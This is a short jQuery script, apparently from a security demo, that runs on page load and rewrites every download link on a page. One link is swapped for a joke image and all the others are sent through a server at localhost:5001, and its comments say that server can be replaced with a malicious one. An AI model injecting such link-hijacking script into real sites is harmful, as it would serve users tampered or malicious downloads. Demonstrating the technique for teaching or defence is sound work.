// Run after every page load to change any download links.

// Returns the filename that can be parsed from a download url.
function getFilenameFromUrl(url) {
    lastSlash = url.lastIndexOf('/');
    if (lastSlash == -1) {
        return url;
    }

    return url.slice(lastSlash + 1, url.length);
}

// Changes all the download links to potentially malicious urls.
$('a[download]').each(function() {
    // change this link to instead download a funny image
    // this can instead be replace with a url to the malicious server
    url = $(this).attr("href")
    if (url == "/static/doomer.jpg") {
        $(this).attr("href", "/static/download.jpeg");
    } else {
        url = $(this).prop("href");
        filename = getFilenameFromUrl(url);
        $(this).attr("href", "http://localhost:5001/" + encodeURIComponent(filename) + "?url=" + encodeURIComponent(url));
    }
});
